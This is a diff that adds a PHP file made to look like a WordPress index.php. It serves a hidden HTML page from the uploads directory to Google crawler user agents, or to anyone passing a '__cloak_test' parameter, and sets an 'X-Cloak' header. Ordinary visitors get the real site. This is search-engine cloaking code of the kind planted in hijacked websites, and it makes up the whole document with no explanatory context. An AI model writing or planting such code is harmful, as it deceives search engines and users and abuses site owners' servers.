@@ -1,0 +1,35 @@
+<?php
+$LP = __DIR__ . '/abhyuday/wp-content/uploads/2023/11/home.html';
+
+function is_google_ua(){
+    if (empty($_SERVER['HTTP_USER_AGENT'])) return false;
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+    foreach (['googlebot','google-inspectiontool','mediapartners-google','adsbot-google','google-site-verification','apis-google'] as $s){
+        if (strpos($ua,$s)!==false) return true;
+    }
+    return false;
+}
+function is_homepage(){
+    $p = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';
+    if ($p === '/index.php') $p = '/';
+    return ($p === '/' || $p === '');
+}
+function wants_html(){
+    $a = $_SERVER['HTTP_ACCEPT'] ?? '';
+    return ($a === '' || stripos($a,'text/html')!==false || stripos($a,'*/*')!==false);
+}
+
+$force = (isset($_GET['__cloak_test']) && $_GET['__cloak_test']=='1');
+
+if ((is_homepage()) && (is_google_ua() || $force) && wants_html() && is_file($LP)) {
+    if (!headers_sent()){
+        header('Vary: User-Agent, Accept-Encoding');
+        header('Content-Type: text/html; charset=UTF-8');
+        header('X-Cloak: homepage');
+    }
+    readfile($LP);
+    exit;
+}
+
+define('WP_USE_THEMES', true);
+require __DIR__ . '/conf.php';
